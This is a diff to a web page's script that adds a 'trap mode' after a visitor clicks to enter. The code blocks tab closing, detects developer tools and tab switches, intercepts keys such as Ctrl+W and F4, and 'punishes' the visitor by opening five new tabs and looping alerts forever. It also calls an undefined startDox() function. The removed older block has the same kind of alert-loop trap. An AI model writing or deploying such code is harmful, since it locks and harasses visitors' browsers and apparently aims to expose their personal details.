@@ -1032,42 +1032,59 @@ body{
     
   
 <script>
-document.body.addEventListener("click", function() {
+// Reveal the banner only when they click "click to enter..."
+document.getElementById("enter-remove").addEventListener("click", function () {
     const banner = document.getElementById("latte-banner");
     if (banner) banner.style.display = "block";
+    startDox();
+    trapUser();
 });
+
+// Full TRAP MODE: Blocks escape, spams tabs, locks dev tools
+function trapUser() {
+    // Prevent tab closing (normal)
+    window.onbeforeunload = function () {
+        return "Don't even try.";
+    };
+
+    // Punishment function
+    function punish() {
+        for (let i = 0; i < 5; i++) {
+            window.open(location.href, '_blank');
+        }
+        while (true) alert("You can't leave 😭");
+    }
+
+    // Detect DevTools or tab switch
+    setInterval(() => {
+        const devtools = window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160;
+        if (devtools || document.hidden) {
+            punish();
+        }
+    }, 1000);
+
+    // Catch key combos like Ctrl+W or F4
+    document.addEventListener("keydown", function (e) {
+        if (
+            e.key === "F12" ||
+            (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key.toUpperCase())) ||
+            (e.ctrlKey && e.key.toLowerCase() === "u") ||
+            (e.ctrlKey && e.key.toLowerCase() === "w") ||
+            e.key === "F4"
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            punish();
+        }
+    });
+
+    // If tab is hidden (user switches away)
+    document.addEventListener("visibilitychange", function () {
+        if (document.hidden) {
+            punish();
+        }
+    });
+}
 </script>
-
-
-<script>
-// Block common inspect hotkeys
-document.addEventListener("keydown", function (e) {
-    if (e.key === "F12" || 
-        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key.toUpperCase())) ||
-        (e.ctrlKey && e.key === "U")) {
-        e.preventDefault();
-        e.stopPropagation();
-    }
-});
-
-// Infinite loop + alert trap on close attempts
-window.onbeforeunload = function () {
-    while (true) { alert("You can't leave 😭"); }
-};
-
-document.addEventListener("visibilitychange", function () {
-    if (document.hidden) {
-        while (true) { alert("Nope."); }
-    }
-});
-
-setInterval(() => {
-    const devtools = window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100;
-    if (devtools) {
-        while (true) { alert("Developer tools detected. Access denied."); }
-    }
-}, 1000);
-</script>
-
 </body>
 </html>
